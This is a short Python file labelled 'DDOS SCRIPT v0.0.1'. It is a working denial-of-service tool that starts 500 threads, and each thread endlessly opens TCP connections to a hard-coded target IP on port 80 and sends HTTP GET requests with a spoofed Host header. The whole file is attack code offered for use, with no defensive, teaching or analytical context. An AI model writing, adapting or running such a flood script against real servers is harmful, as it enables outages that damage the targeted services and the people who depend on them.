#########################
#   DDOS SCRIPT v0.0.1  #
#########################

import socket
import threading

target = '10.0.0.138'
fake_ip = '182.21.20.31'
port = 80


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


if __name__ == '__main__':
    attack_size = 500
    for i in range(attack_size):
        thread = threading.Thread(target=attack)
        thread.start()
